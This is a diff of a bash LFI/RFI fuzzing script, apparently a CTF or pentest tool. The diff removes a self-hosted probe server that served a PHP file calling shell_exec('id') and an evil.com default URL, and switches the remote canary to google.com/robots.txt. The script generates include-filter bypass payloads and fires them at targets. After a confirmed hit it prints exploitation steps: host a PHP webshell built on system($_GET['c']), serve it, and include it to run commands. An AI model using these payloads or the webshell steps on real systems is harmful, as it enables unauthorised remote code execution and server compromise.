@@ -40,9 +40,7 @@ usage() {
     echo -e "  ${CYAN}-p <param>${RESET}   Parameter name to inject (alternative to FUZZ in URL)"
     echo -e "  ${CYAN}-t <type>${RESET}    Test type: lfi | rfi | both  (default: both)"
     echo -e "  ${CYAN}-w <path>${RESET}    LFI wordlist path (default: auto-resolve LFI-Jhaddix.txt)"
-    echo -e "  ${CYAN}-r <url>${RESET}     Remote URL for RFI payloads (overrides auto probe server)"
-    echo -e "  ${CYAN}-L <ip>${RESET}      Your attack box IP for RFI probe server (default: auto-detect tun0)"
-    echo -e "  ${CYAN}-P <port>${RESET}     Port for RFI probe server (default: random free port)"
+    echo -e "  ${CYAN}-r <url>${RESET}     Remote URL for RFI canary (default: http://google.com/robots.txt)"
     echo -e "  ${CYAN}-c <cookie>${RESET}  Cookie string e.g. "PHPSESSID=abc123""
     echo -e "  ${CYAN}-H <header>${RESET}  Extra header e.g. "Authorization: Bearer token""
     echo -e "  ${CYAN}-o <file>${RESET}    Save results to file"
@@ -126,7 +124,7 @@ lfi_payloads() {
 }
 
 # ── RFI payloads ──────────────────────────────────────────────────────────────
-# Generates bypass variants of the probe file URL
+# Generates bypass variants of a remote URL to defeat common include() filters
 rfi_payloads() {
     local remote="$1"
     echo "${remote}"                          # plain
@@ -136,68 +134,8 @@ rfi_payloads() {
     echo "${remote}%23"                       # URL-encoded #
     echo "//${remote#http*://}"               # protocol-relative
     echo "${remote/http:/https:}"             # HTTPS variant
-    echo "http:${remote#*:}"                  # double-protocol bypass
+    echo "http:${remote#*:}"                  # double http: bypass
     echo "${remote}%00.php"                   # null byte + extension junk
-}
-
-# ── RFI probe server ───────────────────────────────────────────────────────────
-# Finds a free port, writes probe files, starts a background HTTP server.
-# Exports: RFI_PROBE_TOKEN  RFI_PROBE_URL  RFI_SERVER_PID  RFI_SERVE_DIR
-setup_rfi_server() {
-    local lhost="$1" port="$2"
-
-    # Auto-detect attack box IP (tun0 first for VPN, then eth0)
-    if [[ -z "$lhost" ]]; then
-        lhost=$(ip addr show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
-        [[ -z "$lhost" ]] && lhost=$(ip addr show eth0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
-        [[ -z "$lhost" ]] && lhost=$(hostname -I 2>/dev/null | awk '{print $1}')
-    fi
-    if [[ -z "$lhost" ]]; then
-        warn "Could not detect local IP — use -L <ip> to specify it" >&2
-        return 1
-    fi
-
-    # Find a free port if none specified
-    if [[ -z "$port" ]]; then
-        port=$(python3 -c "import socket; s=socket.socket(); s.bind(('',0)); print(s.getsockname()[1]); s.close()" 2>/dev/null || echo "8888")
-    fi
-
-    # Unique token — server reflects this back if RFI succeeds
-    RFI_PROBE_TOKEN="RFIPROBE$(date +%s)$$"
-    RFI_SERVE_DIR=$(mktemp -d /tmp/rfi_serve_XXXXXX)
-
-    # probe.txt — plain token, detected if server fetches and includes the file
-    echo "${RFI_PROBE_TOKEN}" > "${RFI_SERVE_DIR}/probe.txt"
-
-    # probe.php — token + id output, detected if server also executes PHP
-    printf '<?php echo "%s"; echo shell_exec("id"); ?>'         "${RFI_PROBE_TOKEN}" > "${RFI_SERVE_DIR}/probe.php"
-
-    RFI_PROBE_URL="http://${lhost}:${port}"
-
-    # Start Python HTTP server in background
-    ( cd "${RFI_SERVE_DIR}" && python3 -m http.server "${port}" >/dev/null 2>&1 ) &
-    RFI_SERVER_PID=$!
-
-    sleep 0.8   # give it time to bind
-
-    if ! kill -0 "${RFI_SERVER_PID}" 2>/dev/null; then
-        warn "HTTP server failed to start on port ${port} — try a different port with -P" >&2
-        return 1
-    fi
-
-    echo -e "${GREEN}[+] Probe server  : ${RFI_PROBE_URL} (PID ${RFI_SERVER_PID})${RESET}" >&2
-    echo -e "${GREEN}[+] Probe token   : ${RFI_PROBE_TOKEN}${RESET}" >&2
-    echo -e "${GREEN}[+] Probe files   : probe.txt (plain)  probe.php (token+id exec)${RESET}" >&2
-    echo -e "${CYAN}[*] Serving from  : ${RFI_SERVE_DIR}${RESET}" >&2
-    return 0
-}
-
-teardown_rfi_server() {
-    if [[ -n "${RFI_SERVER_PID:-}" ]]; then
-        kill "${RFI_SERVER_PID}" 2>/dev/null
-        good "RFI probe server stopped (PID ${RFI_SERVER_PID})" >&2
-    fi
-    [[ -n "${RFI_SERVE_DIR:-}" ]] && rm -rf "${RFI_SERVE_DIR}"
 }
 
 
@@ -234,27 +172,26 @@ detect_lfi() {
 }
 
 # ── Detection: RFI ───────────────────────────────────────────────────────────
-# $1 = response body  $2 = unique probe token we wrote into the served file
+# Looks for evidence that the server attempted to fetch a remote URL.
+# Three outcome levels:
+#   CONFIRMED  — known-good content appeared in the response (google robots.txt marker)
+#   POSSIBLE   — PHP error/warning shows the server tried but was blocked
+#   NOT VULN   — no evidence of remote fetch attempt
 detect_rfi() {
-    local body="$1" probe="$2"
+    local body="$1"
 
-    # Primary: probe token reflected — server fetched and included our file
-    if echo "$body" | grep -qF "$probe"; then
-        echo "Probe token reflected — server fetched and included remote file"
+    # Level 1 — content from google.com/robots.txt appeared in the response
+    # This means allow_url_include=On and the fetch succeeded
+    if echo "$body" | grep -qiE 'User-agent:|Disallow:|Sitemap:'; then
+        echo "Remote file content included in response (robots.txt markers found)"
         return 0
     fi
 
-    # Secondary: RCE output patterns — server executed our PHP payload
-    if echo "$body" | grep -qiP 'uid=\d+\(\w+\)\s+gid=\d+'; then
-        echo "RCE confirmed — id command output detected"
-        return 0
-    fi
-
-    # Tertiary: error messages that reveal the server tried to fetch the URL
-    # (connection refused, failed to open stream, etc.)
-    if echo "$body" | grep -qiE         'failed to open stream|allow_url_include|Connection refused|No such file|Warning.*include|Warning.*require'; then
-        echo "Server attempted remote fetch (error message leaked)"
-        return 0
+    # Level 2 — PHP warning/error shows the server tried to fetch the URL
+    # allow_url_include may be off, or outbound traffic is filtered
+    if echo "$body" | grep -qiE         'failed to open stream|allow_url_include|Connection refused|getaddrinfo|No route to host|Warning.*include|Warning.*require|Fatal error.*include'; then
+        echo "POSSIBLE — server attempted remote fetch but was blocked (check warnings)"
+        return 2
     fi
 
     return 1
@@ -293,22 +230,19 @@ build_url() {
 # ── Main ──────────────────────────────────────────────────────────────────────
 main() {
     local url="" param="" test_type="both" wordlist_path=""
-    local remote_url="http://evil.com/rfi_test.txt"
-    local lhost="" lport=""
+    local remote_url="http://google.com/robots.txt"
     local cookie="" extra_header="" outfile=""
     local delay=0 stop_first=0 verbose=0
 
     [[ $# -eq 0 ]] && usage
 
-    while getopts "u:p:t:w:r:c:H:L:P:o:d:xvh" opt; do
+    while getopts "u:p:t:w:r:c:H:o:d:xvh" opt; do
         case "$opt" in
             u) url="$OPTARG" ;;
             p) param="$OPTARG" ;;
             t) test_type="$OPTARG" ;;
             w) wordlist_path="$OPTARG" ;;
             r) remote_url="$OPTARG" ;;
-            L) lhost="$OPTARG" ;;
-            P) lport="$OPTARG" ;;
             c) cookie="$OPTARG" ;;
             H) extra_header="$OPTARG" ;;
             o) outfile="$OPTARG" ;;
@@ -396,68 +330,66 @@ main() {
     if [[ "$test_type" == "rfi" || "$test_type" == "both" ]]; then
         sep
         info "Starting RFI tests..."
+        info "Using google.com/robots.txt as a known-good remote file"
+        info "RFI requires allow_url_include=On in PHP to succeed"
         sep
+        echo ""
 
-        # Globals set by setup_rfi_server
-        RFI_PROBE_TOKEN=""; RFI_PROBE_URL=""
-        RFI_SERVER_PID="";  RFI_SERVE_DIR=""
+        # Use google.com/robots.txt as the probe target:
+        #   - well-known, always available
+        #   - flat file with no redirects
+        #   - unique content (User-agent: / Disallow:) easy to detect in the response
+        local rfi_probe="http://google.com/robots.txt"
 
-        if setup_rfi_server "$lhost" "$lport"; then
-            # Ensure server is killed on exit/interrupt
-            trap 'teardown_rfi_server' EXIT INT TERM
+        while IFS= read -r payload; do
+            [[ -z "$payload" || "$payload" == \#* ]] && continue
 
-            warn "RFI requires allow_url_include=On (and allow_url_fopen=On) in PHP"
-            echo ""
+            local target_url
+            target_url=$(build_url "$url" "$param" "$payload")
+            local response
+            response=$(send_request "$target_url" "$cookie" "$extra_header")
+            local rfi_exit
+            ((tested++))
 
-            # Test probe.txt first (plain inclusion), then probe.php (inclusion + RCE)
-            for probe_file in probe.txt probe.php; do
-                local probe_url="${RFI_PROBE_URL}/${probe_file}"
-                info "Testing probe: $probe_url"
-                local found_for_file=0
+            local match=""
+            match=$(detect_rfi "$response")
+            rfi_exit=$?
 
-                while IFS= read -r payload; do
-                    [[ -z "$payload" || "$payload" == \#* ]] && continue
+            if [[ $rfi_exit -eq 0 ]]; then
+                vuln "[RFI CONFIRMED] $payload"
+                detail "URL    : $target_url"
+                detail "Reason : $match"
+                detail "Impact : allow_url_include=On — server fetched and included the remote URL"
+                echo ""
+                echo -e "${YELLOW}  Next steps:${RESET}"
+                echo -e "${YELLOW}  1. Host a PHP webshell:  echo '<?php system(\$_GET["c"]); ?>' > shell.php${RESET}"
+                echo -e "${YELLOW}  2. Serve it:             python3 -m http.server 8000${RESET}"
+                echo -e "${YELLOW}  3. Exploit:              ${url/FUZZ/http:\/\/YOUR_IP:8000\/shell.php?c=id}${RESET}"
+                echo ""
+                [[ -n "$outfile" ]] && echo "[RFI CONFIRMED] $target_url | $match" >> "$outfile"
+                ((vuln_count++))
+                [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break; }
 
-                    local target_url
-                    target_url=$(build_url "$url" "$param" "$payload")
-                    local response
-                    response=$(send_request "$target_url" "$cookie" "$extra_header")
-                    ((tested++))
+            elif [[ $rfi_exit -eq 2 ]]; then
+                warn "[RFI POSSIBLE] $payload"
+                detail "URL    : $target_url"
+                detail "Reason : $match"
+                detail "Impact : Server attempted fetch but was blocked — may work with your own IP"
+                echo ""
+                echo -e "${CYAN}  Suggestion: the server tried to reach out but was blocked.${RESET}"
+                echo -e "${CYAN}  Try pointing at your own machine instead of google.com:${RESET}"
+                echo -e "${CYAN}  Re-run with: -r http://YOUR_IP/test.txt${RESET}"
+                echo ""
+                [[ -n "$outfile" ]] && echo "[RFI POSSIBLE] $target_url | $match" >> "$outfile"
+                ((vuln_count++))
+                [[ "$stop_first" -eq 1 ]] && { good "Stopping on first hit (-x)."; break; }
 
-                    local match=""
-                    if match=$(detect_rfi "$response" "$RFI_PROBE_TOKEN"); then
-                        vuln "[RFI CONFIRMED] $payload"
-                        detail "Probe   : $probe_file"
-                        detail "URL     : $target_url"
-                        detail "Reason  : $match"
-                        if [[ "$probe_file" == "probe.php" ]]; then
-                            detail "PHP exec: server ran shell_exec('id') — full RCE likely"
-                        fi
-                        echo
-                        [[ -n "$outfile" ]] && echo "[RFI] $target_url | $probe_file | $match" >> "$outfile"
-                        ((vuln_count++))
-                        found_for_file=1
-                        if [[ "$stop_first" -eq 1 ]]; then
-                            good "Stopping on first hit (-x)."
-                            teardown_rfi_server
-                            break 2
-                        fi
-                        # Working payload found for this probe file — move to next
-                        break
-                    else
-                        [[ "$verbose" -eq 1 ]] && detail "No hit: $payload"
-                    fi
+            else
+                [[ "$verbose" -eq 1 ]] && detail "No hit: $payload"
+            fi
 
-                    [[ "$delay" != "0" ]] && sleep "$delay"
-                done < <(rfi_payloads "$probe_url")
-            done
-
-            teardown_rfi_server
-
-        else
-            warn "Could not start RFI probe server — skipping RFI tests"
-            warn "Ensure python3 is available, or specify IP/port with -L <ip> -P <port>"
-        fi
+            [[ "$delay" != "0" ]] && sleep "$delay"
+        done < <(rfi_payloads "$rfi_probe")
     fi
 
     # ── Summary ───────────────────────────────────────────────────────────────
